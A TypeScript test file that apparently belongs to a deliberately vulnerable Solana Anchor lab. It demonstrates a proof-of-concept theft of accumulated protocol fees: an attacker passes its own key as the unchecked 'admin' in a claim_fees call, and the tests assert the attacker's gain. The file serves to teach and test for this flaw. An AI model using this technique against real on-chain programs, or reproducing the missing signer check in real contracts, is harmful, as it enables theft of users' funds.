/**
 * VULN 11 — Missing access control on a privileged instruction.
 *
 * `claim_fees` is supposed to be admin-only, but the `admin` account is
 * never checked (no signer constraint, no key comparison). The attacker
 * simply calls it with THEIR wallet as both "admin" and recipient and
 * takes every fee the protocol has accumulated.
 */
import { assert } from "chai";
import {
  PROG_IDS, provider, anchorProgram, findPda, seedsBuf, airdrop, newFundedKeypair,
  sendSelfSigned, solBalance, BN, LAMPORTS_PER_SOL,
} from "./util";

describe("vuln11 missing access control / fee theft", () => {
  const program = anchorProgram("vuln11_access_control", PROG_IDS.vuln11);
  const config = findPda([seedsBuf("config")[0]], PROG_IDS.vuln11)[0];
  const feeVault = findPda([seedsBuf("fee_vault")[0]], PROG_IDS.vuln11)[0];

  let victim: any, attacker: any;
  let attackerBefore = 0;

  before(async () => {
    await airdrop(provider.wallet.publicKey, 50);
    victim = await newFundedKeypair();
    attacker = await newFundedKeypair();

    await program.methods.initialize()
      .accounts({ config, admin: provider.wallet.publicKey, feeVault })
      .rpc();

    // Two honest users deposit 5 SOL each -> 1 SOL of fees accumulated.
    for (const user of [victim, provider.wallet]) {
      await program.methods.deposit(new BN(5 * LAMPORTS_PER_SOL))
        .accounts({ config, feeVault, user: user.publicKey })
        .signers(user === provider.wallet ? [] : [victim])
        .rpc();
    }

    const cfg = await program.account.config.fetch(config);
    assert.equal(cfg.feesCollected.toString(), (LAMPORTS_PER_SOL / 1).toString());
  });

  it("attacker claims protocol fees WITHOUT any admin signature", async () => {
    attackerBefore = await solBalance(attacker.publicKey);

    // No admin signature anywhere: the instruction itself has no Signer
    // constraint, so a self-transfer is only needed to make the fee payer
    // a required signer for the runtime.
    const ix = await program.methods.claimFees()
      .accounts({
        config,
        feeVault,
        admin: attacker.publicKey,      // "admin" = attacker, never checked
        recipient: attacker.publicKey,  // fees go to the attacker
      })
      .instruction();

    await sendSelfSigned([ix], attacker);

    // The whole fee pool (1 SOL) landed in the attacker's wallet.
    const after = await solBalance(attacker.publicKey);
    assert.isAtLeast(after - attackerBefore, LAMPORTS_PER_SOL - 10_000);

    const cfg = await program.account.config.fetch(config);
    assert.equal(cfg.feesCollected.toString(), "0");
  });

  it("fees (1 SOL) are gone; honest deposits (9 SOL) remain untouched", async () => {
    // Deposits: 10 SOL of which 1 SOL was "fees" — now claimed by the attacker.
    const vault = await solBalance(feeVault);
    assert.isAtLeast(vault, 9 * LAMPORTS_PER_SOL);
    assert.isBelow(vault, 9 * LAMPORTS_PER_SOL + 3_000_000); // + rent of the data account
  });
});
